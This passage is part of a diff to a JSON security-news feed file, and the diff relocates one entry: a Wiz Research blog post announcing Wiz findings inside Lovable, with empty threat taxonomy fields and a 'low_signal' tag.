-      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
-      "published": "2026-05-07T13:00:00+00:00",
-      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
-      "author": "Roi Kessler",
-      "in_window": false,
-      "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": "low_signal",
-        "confidence_tier": "tier_2_operator",
-        "role_map": {},
-        "weak_tags": {
-          "products": []
-        }
-      }
-    },
-    {
       "source": "Cloudflare Security",
       "cohort": "cloud_identity_infrastructure",
       "category": "cloud_identity_infrastructure",
@@ -39426,6 +39179,33 @@
         "role_map": {
           "Linux kernel": "target"
         },
+        "weak_tags": {
+          "products": []
+        }
+      }
+    },
+    {
+      "source": "Wiz Research",
+      "cohort": "cloud_identity_infrastructure",
+      "category": "cloud_identity_infrastructure",
+      "title": "Build Fast, Build Secure: Wiz findings are now in Lovable",
+      "link": "https://www.wiz.io/blog/introducing-wiz-lovable-integration",
+      "published": "2026-05-07T13:00:00+00:00",
+      "summary": "With Wiz in Lovable, every builder can catch and fix risks in real time, keeping apps secure as they’re created",
+      "author": "Roi Kessler",
+      "in_window": false,
+      "taxonomy": {
+        "threat_categories": [],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": "low_signal",
+        "confidence_tier": "tier_2_operator",
+        "role_map": {},
         "weak_tags": {
           "products": []
         }
